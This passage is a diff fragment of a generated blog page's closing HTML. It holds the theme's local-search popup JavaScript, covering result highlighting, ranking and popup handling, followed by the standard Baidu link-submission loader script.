+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
